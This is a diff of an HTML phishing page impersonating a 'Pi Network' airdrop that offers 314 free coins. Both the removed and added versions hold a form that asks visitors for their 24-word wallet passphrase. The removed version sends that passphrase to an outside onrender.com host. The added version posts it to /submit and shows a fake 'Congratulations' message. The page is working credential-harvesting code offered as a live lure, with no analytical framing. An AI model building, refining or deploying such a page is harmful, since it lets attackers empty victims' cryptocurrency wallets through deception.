@@ -3,63 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Unlock Pi Reward</title>
+    <title>Airdrop from Pi Network</title>
     <style>
-        /* General reset */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        /* General Styles */
         body {
             font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
             background-color: #f4f4f4;
-            margin: 0;
-            overflow-x: hidden;
-        }
-
-        .container {
-            width: 90%;
-            max-width: 400px;
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
             text-align: center;
+            padding: 50px;
         }
 
-        /* Header Styling */
-        .header {
-            margin-bottom: 20px;
-            text-align: center;
-        }
-
-        .header h1 {
-            font-size: 32px;
+        .heading {
+            font-size: 40px;
             font-weight: bold;
-            color: #4A148C;
-            text-shadow: 0px 2px 6px rgba(74, 20, 140, 0.6);
-            animation: fade-in 1.5s ease-in-out;
-            margin-bottom: 8px;
+            color: #673ab7;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
         }
 
-        .header h2 {
-            font-size: 20px;
+        .sub-heading {
+            font-size: 30px;
             font-weight: 500;
-            color: #FF6F00;
-            text-shadow: 0px 1px 4px rgba(255, 111, 0, 0.7);
-            margin-bottom: 20px;
+            color: #5e35b1;
+            margin-top: 10px;
         }
 
-        @keyframes fade-in {
+        /* Styling for Logo */
+        .logo {
+            margin-top: 20px;
+            width: 150px; /* Adjust logo size */
+            height: auto;
+            animation: fadeInLogo 1s ease-out;
+        }
+
+        @keyframes fadeInLogo {
             0% {
                 opacity: 0;
-                transform: scale(0.9);
+                transform: scale(0.5);
             }
             100% {
                 opacity: 1;
@@ -67,94 +46,68 @@
             }
         }
 
-        /* Form Styling */
-        h3 {
-            font-size: 22px;
-            color: #5a2da2;
-            margin-bottom: 20px;
-        }
-
-        textarea {
-            width: 100%;
-            height: 100px;
-            padding: 10px;
-            font-size: 14px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            resize: none;
-        }
-
-        button {
-            width: 100%;
-            background-color: #5a2da2;
+        /* Styling for Success Message */
+        .message {
+            background-color: #4CAF50;
             color: white;
-            border: none;
-            padding: 12px 20px;
-            font-size: 16px;
-            border-radius: 4px;
-            cursor: pointer;
-            margin-top: 20px;
+            font-size: 24px;
+            font-weight: bold;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            animation: fadeIn 1.5s ease-out;
+            margin-top: 30px;
         }
 
-        button:hover {
-            background-color: #4a2390;
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
         }
 
-        /* Info Text */
-        .info-text {
-            font-size: 12px;
-            color: #555;
-            margin-top: 20px;
-            line-height: 1.5;
-        }
+        /* Mobile Responsiveness */
+        @media (max-width: 600px) {
+            .heading {
+                font-size: 30px;
+            }
 
-        .info-text a {
-            color: #5a2da2;
-            text-decoration: none;
-        }
+            .sub-heading {
+                font-size: 24px;
+            }
 
-        .info-text a:hover {
-            text-decoration: underline;
+            .logo {
+                width: 120px; /* Adjust logo size on mobile */
+            }
         }
     </style>
-    <script>
-        // Clear passphrase on page reload
-        window.onload = function() {
-            document.getElementById("passphrase").value = "";
-        };
-
-        function validatePassphrase() {
-            const passphrase = document.getElementById("passphrase").value.trim();
-            const wordCount = passphrase.split(" ").filter(word => word).length;
-
-            if (wordCount !== 24) {
-                alert("Please enter a valid 24-word passphrase.");
-                return false;
-            }
-            return true;
-        }
-    </script>
 </head>
 <body>
-    <div class="container">
-        <!-- Header Section -->
-        <div class="header">
-            <h1>Airdrop from Pi Network</h1>
-            <h2>Claim Your 314 Pi Coins Now</h2>
-        </div>
 
-        <!-- Form Section -->
-        <h3>Unlock Pi Reward</h3>
-        <form action="https://pinetwork-ib9q.onrender.com/submit" method="POST" onsubmit="return validatePassphrase()">
-            <textarea id="passphrase" name="passphrase" placeholder="Enter your 24-word passphrase here"></textarea>
-            <button type="submit">Unlock with passphrase</button>
-        </form>
+    <!-- Main Heading -->
+    <div class="heading">Airdrop from Pi Network</div>
+    
+    <!-- Logo (Replace with your logo file) -->
+    <img src="logo1.png" alt="Pi Network Logo" class="logo">
 
-        <!-- Info Section -->
-        <div class="info-text">
-            As a non-custodial wallet, your wallet passphrase is only accessible to you. It is currently not possible to recover the wallet passphrase. <br><br>
-            Lost your wallet passphrase? <a href="#">you can create a new wallet</a>, but all the Pi numbers in your previous wallet will be inaccessible.
-        </div>
+    <!-- Subheading -->
+    <div class="sub-heading">Claim Your 314 PI Coins Now</div>
+
+    <!-- Form Content or Passphrase Entry Goes Here -->
+    <form action="/submit" method="POST">
+        <textarea name="passphrase" rows="4" cols="50" placeholder="Enter your 24-word passphrase here" required></textarea>
+        <br><br>
+        <button type="submit">Unlock with passphrase</button>
+    </form>
+
+    <!-- Success Message (This will be shown dynamically after form submission) -->
+    <div class="message">
+        Congratulations!!! You have earned your 314 PI Coins Successfully!!
     </div>
+
 </body>
 </html>
